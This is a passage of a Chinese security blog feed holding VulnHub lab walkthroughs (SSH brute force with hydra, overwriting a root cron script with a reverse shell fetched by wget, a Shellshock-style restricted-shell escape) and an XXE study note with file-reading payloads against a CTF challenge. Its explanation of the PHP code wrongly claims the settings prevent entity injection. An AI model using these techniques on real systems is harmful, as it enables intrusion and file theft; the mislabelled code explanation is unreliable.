<p><img src="/picture/image-20250408151424196.png" alt="image-20250408151424196"></p>
<p>由于用户名刚好是 10 个，将它们分成 user1 和 user2 ，再分别进行爆破，结果还是一样</p>
<p>试来试去都不行，唯一没试过的就是 <code>Pass.txt</code>  这个文件名当作密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -p Pass.txt 192.168.186.147 ssh</span><br></pre></td></tr></table></figure>

<p>结果密码还真是  <code>Pass.txt</code> ，有点脑洞</p>
<p><img src="/picture/image-20250408153754020.png" alt="image-20250408153754020"></p>
<p>使用 SSH 远程登录</p>
<p><img src="/picture/image-20250408160921699.png" alt="image-20250408160921699"></p>
<p>接下来就是提权，枚举一遍后，发现如下权限为 777 的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm 777 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/srv/ftp/lol.pcap</span><br><span class="line">/var/tmp/cleaner.py.swp</span><br><span class="line">/var/www/html/sup3rs3cr3tdirlol/roflmao</span><br><span class="line">/var/log/cronlog</span><br><span class="line">/lib/log/cleaner.py</span><br></pre></td></tr></table></figure>

<p>在 &#x2F;var&#x2F;log&#x2F;cronlog 中可以发现 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件的调度任务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件，发现是定期删除 &#x2F;tmp 目录下文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /lib/log/cleaner.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>

<p>在本机制作 cleaner.py ，将反弹 shell 语句写入，通过 http 服务上传并覆盖 &#x2F;lib&#x2F;log&#x2F;cleaner.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://&lt;IP&gt;/cleaner.py -O /lib/log/cleaner.py</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250408161320240.png" alt="image-20250408161320240"></p>
<p>开启 nc 监听，一会后就能获得反弹回来的 root  shell ，并获得 proof.txt</p>
<p><img src="/picture/image-20250408161529607.png" alt="image-20250408161529607"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll 2 Walkthrough</title>
    <url>/2025/04/09/Tr0ll%202/</url>
    <content><![CDATA[<h1 id="Tr0ll-2-Walkthrough"><a href="#Tr0ll-2-Walkthrough" class="headerlink" title="Tr0ll 2 Walkthrough"></a>Tr0ll 2 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll: 2</a></p>
<p><img src="/picture/image-20250408213316217.png" alt="image-20250408213316217"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250408211321595.png" alt="image-20250408211321595"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.148 </span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250408211346106.png" alt="image-20250408211346106"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 21,22,80 -A 192.168.186.148</span><br></pre></td></tr></table></figure>

<p>发现 FTP、SSH 和 HTTP 服务</p>
<p><img src="/picture/image-20250408211406797.png" alt="image-20250408211406797"></p>
<p>尝试使用 anonymous 等一些默认密码登陆，但是失败了</p>
<p><img src="/picture/image-20250408211616615.png" alt="image-20250408211616615"></p>
<p>直接访问 80 端口，发现是图片，查看源代码发现泄露用户 Tr0ll</p>
<p><img src="/picture/image-20250408185719759.png" alt="image-20250408185719759"></p>
<p>尝试使用 Tr0ll&#x2F;Tr0ll 连接 FTP 成功，ls 发现 lmao.zip 并下载至本地</p>
<p><img src="/picture/image-20250408185617829.png" alt="image-20250408185617829"></p>
<p>下载的 lmao.zip 需要密码，尝试在 80 端口寻找密码，先进行简单的目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.148/</span><br></pre></td></tr></table></figure>

<p>发现 robots.txt ，访问发现是一堆目录</p>
<p>将目录保存为字典文件，枚举出 200 的目录</p>
<p><img src="/picture/image-20250408174849173-1744109857156-1.png" alt="image-20250408174849173"></p>
<p>发现四个目录都含有一张图片，保存至 Desktop&#x2F;picture 中，发现 dont_bother.jpg 的图片稍微大一些</p>
<p><img src="/picture/image-20250408175829900.png" alt="image-20250408175829900"></p>
<p>使用如下命令读取字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings dont_bother.jpg</span><br></pre></td></tr></table></figure>

<p>在最后一行发现 hint</p>
<p><img src="/picture/image-20250408175915874.png" alt="image-20250408175915874"></p>
<p>进一步访问 y0ur_self 目录，发现 answer.txt </p>
<p><img src="/picture/image-20250408180013441.png" alt="image-20250408180013441"></p>
<p>其中全是 base64 编码的密文，且存在重复字符串</p>
<p><img src="/picture/image-20250408180323615.png" alt="image-20250408180323615"></p>
<p>去除重复并进行 base64 解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort answer.txt | uniq &gt; uniq_answer.txt</span><br><span class="line">base64 --decode uniq_answer.txt &gt; decode_answer.txt</span><br></pre></td></tr></table></figure>

<p>读取 zip 文件密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john lmao.zip &gt; zip.hash</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250408185900537.png" alt="image-20250408185900537"></p>
<p>使用处理后的 decode_answer.txt 破解 zip 密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=decode_answer.txt zip.hash </span><br></pre></td></tr></table></figure>

<p>成功破解</p>
<p><img src="/picture/image-20250408185830729.png" alt="image-20250408185830729"></p>
<p>使用密码将 zip 文件解压，发现是 SSH 的 RSA 私钥</p>
<p><img src="/picture/image-20250408190136834.png" alt="image-20250408190136834"></p>
<p>由于 RSA 私钥兼容性问题，需要添加 <code>-o PubkeyAcceptedAlgorithms=+ssh-rsa</code> 选项，为了防止 RSA 过于开放，需要将私钥权限设置为 600</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 noob</span><br><span class="line">ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob noob@192.168.186.148</span><br></pre></td></tr></table></figure>

<p>发现刚建立起来的 SSH 链接在极短时间被关闭了</p>
<p><img src="/picture/image-20250408194617138.png" alt="image-20250408194617138"></p>
<p>在这种情况下，需要逃逸 restrict shell ，可以尝试使用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;/bin/bash&quot; or &quot;/bin/sh&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</span><br></pre></td></tr></table></figure>

<p>最终只有第三种成功了</p>
<p><img src="/picture/image-20250408200146103.png" alt="image-20250408200146103"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE 学习记录</title>
    <url>/2024/03/11/XXE%20exploit/</url>
    <content><![CDATA[<p>前言：</p>
<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对 moectf 那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把 XXE 系统学个一遍。。。</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE 全称是：XML External Entity，也就是 XML 外部实体注入攻击，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
<ol>
<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
</ol>
<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>带有 DTD 的 XML 文档实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
<li>您还可以使用 DTD 来验证您自身的数据。</li>
</ul>
<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个示例中：</p>
<p>第一个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
<p>第二个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
<p>实体根据引用方式，还可分为内部实体与外部实体</p>
<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
<p><img src="/picture/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
<p>实列：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>以下是代码的简要解释：</p>
<ol>
<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
</ol>
<p>贴个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
<p>以下为主要内容摘要：</p>
<blockquote>
<blockquote>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

